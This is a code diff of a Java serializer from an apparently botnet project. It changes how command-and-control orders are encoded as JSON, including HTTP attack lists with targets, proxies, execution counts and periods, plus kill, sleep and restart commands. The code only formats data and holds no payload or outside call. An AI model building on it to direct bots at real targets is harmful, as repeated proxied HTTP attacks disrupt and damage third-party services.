@@ -26,16 +26,15 @@
 
 package com.acmutv.botnet.core.control.command.serial;
 
+import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.control.command.BotCommand;
-import com.acmutv.botnet.core.target.HttpTarget;
-import com.acmutv.botnet.tool.net.HttpMethod;
-import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.time.Interval;
 import com.fasterxml.jackson.core.JsonGenerator;
 import com.fasterxml.jackson.databind.SerializerProvider;
 import com.fasterxml.jackson.databind.ser.std.StdSerializer;
 
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.List;
 
 /**
@@ -77,29 +76,10 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
     if (value.getScope().isWithParams()) {
       switch (value.getScope()) {
         case ATTACK_HTTP:
-          final HttpMethod httpMethod = (HttpMethod) value.getParams().get("method");
-          @SuppressWarnings("unchecked") final List<HttpTarget> httpTargets = (List<HttpTarget>) value.getParams().get("targets");
-          final HttpProxy httpProxy = (HttpProxy) value.getParams().get("proxy");
+          final List<HttpAttack> httpAttacks = (List<HttpAttack>) value.getParams().get("attacks");
           final Interval httpDelay = (Interval) value.getParams().get("delay");
 
-          gen.writeStringField("method", httpMethod.name());
-
-          gen.writeArrayFieldStart("targets");
-          for (HttpTarget target : httpTargets) {
-            gen.writeStartObject();
-            gen.writeStringField("url", target.getUrl().toString());
-            gen.writeNumberField("maxAttempts", target.getMaxAttempts());
-            gen.writeStringField("period", target.getPeriod().toString());
-            if (target.getProxy() != null) {
-              gen.writeStringField("proxy", target.getProxy().toCompactString());
-            }
-            gen.writeEndObject();
-          }
-          gen.writeEndArray();
-
-          if (httpProxy != null) {
-            gen.writeStringField("proxy", httpProxy.toCompactString());
-          }
+          serializeHttpAttacks("attacks", gen, httpAttacks);
 
           if (httpDelay != null) {
             gen.writeStringField("delay", httpDelay.toString());
@@ -108,7 +88,12 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
           break;
 
         case CALMDOWN:
+          final Boolean calmdownWait = (Boolean) value.getParams().get("wait");
           final Interval calmdownDelay = (Interval) value.getParams().get("delay");
+
+          if (calmdownWait != null) {
+            gen.writeBooleanField("wait", calmdownWait);
+          }
 
           if (calmdownDelay != null) {
             gen.writeStringField("delay", calmdownDelay.toString());
@@ -117,11 +102,11 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
           break;
 
         case KILL:
-          final Interval killTimeout = (Interval) value.getParams().get("timeout");
+          final Boolean killWait = (Boolean) value.getParams().get("wait");
           final Interval killDelay = (Interval) value.getParams().get("delay");
 
-          if (killTimeout != null) {
-            gen.writeStringField("timeout", killTimeout.toString());
+          if (killWait != null) {
+            gen.writeBooleanField("wait", killWait);
           }
 
           if (killDelay != null) {
@@ -132,9 +117,14 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
 
         case RESTART:
           final String resource = value.getParams().get("resource").toString();
+          final Boolean restartWait = (Boolean) value.getParams().get("wait");
           final Interval restartDelay = (Interval) value.getParams().get("delay");
 
           gen.writeStringField("resource", resource);
+
+          if (restartWait != null) {
+            gen.writeBooleanField("wait", restartWait);
+          }
 
           if (restartDelay != null) {
             gen.writeStringField("delay", restartDelay.toString());
@@ -155,10 +145,21 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
           final Interval sleepTimeout = (Interval) value.getParams().get("timeout");
           final Interval sleepDelay = (Interval) value.getParams().get("delay");
 
-          gen.writeStringField("timeout", sleepTimeout.toString());
+          if (sleepTimeout != null) {
+            gen.writeStringField("timeout", sleepTimeout.toString());
+          }
 
           if (sleepDelay != null) {
             gen.writeStringField("delay", sleepDelay.toString());
+          }
+
+          break;
+
+        case WAKEUP:
+          final Interval wakeupDelay = (Interval) value.getParams().get("delay");
+
+          if (wakeupDelay != null) {
+            gen.writeStringField("delay", wakeupDelay.toString());
           }
 
           break;
@@ -168,5 +169,39 @@ public class BotCommandSerializer extends StdSerializer<BotCommand> {
       }
     }
     gen.writeEndObject();
+  }
+
+  /**
+   * Serializes a list of {@link HttpAttack}.
+   * @param fieldName the field to serialize into.
+   * @param gen the generator to serialize with.
+   * @param attacks the list of attacks to serialize.
+   * @throws IOException when the list of {@link HttpAttack} cannot be serialized.
+   */
+  private void serializeHttpAttacks(String fieldName, JsonGenerator gen, List<HttpAttack> attacks) throws IOException {
+    gen.writeArrayFieldStart(fieldName);
+    for (HttpAttack attack : attacks) {
+      gen.writeStartObject();
+      gen.writeStringField("method", attack.getMethod().name());
+      gen.writeStringField("target", attack.getTarget().toString());
+      if (attack.getProxy() != null) {
+        gen.writeStringField("proxy", attack.getProxy().toCompactString());
+      }
+      if (attack.getProperties() != null) {
+        gen.writeObjectFieldStart("properties");
+        List<String> sortedKeys = new ArrayList<>();
+        attack.getProperties().keySet().stream().sorted().forEachOrdered(sortedKeys::add);
+        for (String k : sortedKeys) {
+          gen.writeStringField(k, attack.getProperties().get(k));
+        }
+        gen.writeEndObject();
+      }
+      gen.writeNumberField("executions", attack.getExecutions());
+      if (attack.getPeriod() != null) {
+        gen.writeStringField("period", attack.getPeriod().toString());
+      }
+      gen.writeEndObject();
+    }
+    gen.writeEndArray();
   }
 }
